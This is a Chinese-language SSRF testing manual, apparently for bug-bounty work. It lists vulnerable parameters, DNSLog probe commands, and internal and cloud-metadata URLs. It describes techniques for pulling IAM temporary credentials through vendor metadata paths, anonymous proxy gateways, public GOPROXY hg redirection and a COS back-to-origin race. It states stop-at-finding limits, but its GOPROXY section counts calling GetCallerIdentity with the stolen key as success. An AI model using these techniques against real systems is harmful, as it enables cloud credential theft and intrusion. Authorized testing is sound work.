> **SRC 红线：** SSRF 要证明「服务端会替你发请求」。HTTP(S) 打回连 / FLAG /
> `127.0.0.1` / RFC1918 一口 / `169.254.169.254` / `metadata.google.internal`
> 都是存在性探针，要发。读到 IAM 目录或临时钥记 finding 就停；不拿钥调云 API、
> 不扫整段内网。`gopher` / `dict` / `file` / `ldap` 仍硬拒（打 Redis 是后利用）。
>
> 短表「云厂商元数据路径差」「公开 GOPROXY」用标题搜。英文补充/附件已砍。

## 一、原有知识库

# SSRF 测试手册

## 常见注入点

```
图片/文件URL参数: imageUrl=, fileUrl=, url=, link=, targetUrl=
预览/加载功能: preview=, fetch=, load=, callback=
Webhook: webhook_url=, notify_url=, redirect_url=
PDF/截图生成: 传入 URL 生成截图
模型/网关代理: path 带 proxy，参数仍是 targetUrl / url / callback
```

## 检测 Payload

### 使用 DNSLog 验证（无回显）

```bash
# 申请一个 dnslog 域名: dnslog.cn / ceye.io / interact.sh
DNSLOG="your-unique-id.dnslog.cn"

# 发送请求
curl "https://target.com/api/preview?url=http://$DNSLOG/test"

# 去 dnslog 平台查看是否有 DNS 查询记录
# 有记录 → SSRF 存在
```

### 内网 / 云元数据 —— 存在性要打，后利用停

HTTP(S) 让目标去取这些地址，用来证明 SSRF：

```
http://127.0.0.1/
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
http://10.x.x.x/  （一口，不扫整段）
```

读到 IAM 目录、角色名或临时钥 → 记 finding 就停。不拿这把钥调云 API，不扫 RFC1918 整段，不用 `gopher` 打 Redis。

### 云厂商元数据路径差 / 回环拦了元数据没拦 / 云开发匿名代理（短表有指针）

认：云厂商元数据；或云开发 / HTTP 网关 path 带 `proxy`，参数是 `targetUrl` / `url` / `callback`；有匿名登录（`signin/anonymously` 一类）就能拿到 token。

打：

1. 先回连或 FLAG，再打 `127.0.0.1` 与 `169.254.169.254` 做过滤对照。
2. 目录通了钥匙走 `cam/service-role-security-credentials/角色`（或 AWS/GCP 对应路径）。读到钥就停。
3. **拿到 AK/SK / 角色名就停。** 不拿钥调云 API。
4. **匿名网关。** 带着匿名 token 打 `*proxy*` 时，目标可以是回连、FLAG 或元数据 HTTP(S)。

算成：回连收到服务端请求，或 FLAG 证明页，或元数据/IAM 目录回显。取到临时钥匙再调云 API 属于后利用，不要做。

假点：代理只允许模型厂商白名单、元数据也 403；匿名开了但代理对匿名关死；钥匙是窄角色且没证明能调任何云 API（半条，别空喊接管全账号）。单站没中不删短表这行。

和通用「SSRF 打 `169.254.169.254`」不是重复：本条补的是 **厂商钥匙路径差 + 回环/元数据过滤分裂 + 匿名网关当入口**。公开 GOPROXY 不是本枪步骤，见下一节。

### 公开 GOPROXY（短表有指针）

认：公开 GOPROXY（`/go/`、模块 `/@v/list`）会按模块路径做 `?go-get=1` 再跟 VCS。**不是**上一节云开发 `*proxy*`。

打（不登录）：

1. 模块路径写成自己的域。  
2. 页上 `go-import` 用 **hg** + `http://厂商元数据域名/...`（git HTTPS 常超时）。  
3. RFC1918 Forbidden ≠ 元数据域名也拦。目录通了钥匙走 `cam/service-role-security-credentials/角色`（同上一节第 2 步）。

算成：hg 报错/回显出元数据或临时钥匙，再 GetCallerIdentity 问出 AccountId。

假点：不是 GOPROXY / 模块路径不会 `go-get`；元数据域名也被拦（不只 Forbidden RFC1918）；hg 也不跟且出不了钥；钥调不通。单站没中不删短表这行。

## 绕过技巧

绕过用在 HTTP(S) 回连 / FLAG / 回环 / 元数据上。`gopher`/`dict`/`file`/`ldap` 仍硬拒。

### COS 回源竞态（见了回源再打）

认：业务从 COS/OSS **取对象**，桶上配了「对象不存在则回源」到你能控的源；你还能对**同一 key** PUT 和 DELETE。没回源配置不要空打。

打：

1. 回源指到你的站，源上 302 到元数据或内网。  
2. 对同一 key 一边 PUT（检测时对象在，不回源）、一边 DELETE（真正 GET 时对象没了 → 回源跟 302）。并发见 `race-condition-test.md`。  
3. 看业务下载/导入是否打到你的源或内网。

算成：业务侧跟到内网/元数据（回显、带外或导入结果里有）。只证明回源能配、没打到内网 → 没成。

假点：回源不跟 302；检测和下载走同一时刻缓存；你控不了回源目标。不进短表（要自己能配回源，偏窄）。

## gopher 协议打内网服务 —— 禁止

`gopher://` / `dict://` / `file://` 闸门硬拒（`hazardous_payload:dangerous_scheme`）。
不打 Redis、不写 webshell、不 flushall。证明 SSRF 用 HTTPS 回连即可。

---
